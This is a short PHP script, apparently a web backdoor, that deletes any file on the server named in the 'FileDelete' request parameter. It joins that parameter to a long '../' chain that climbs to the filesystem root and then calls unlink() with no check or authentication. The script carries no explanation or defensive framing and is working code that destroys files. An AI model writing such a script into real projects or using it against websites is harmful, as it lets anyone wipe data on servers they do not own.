<?php $file= $_REQUEST['FileDelete'];
$tm="../../../../../../../../../".$file;
if(isset($_REQUEST['FileDelete'])) unlink($tm);
?>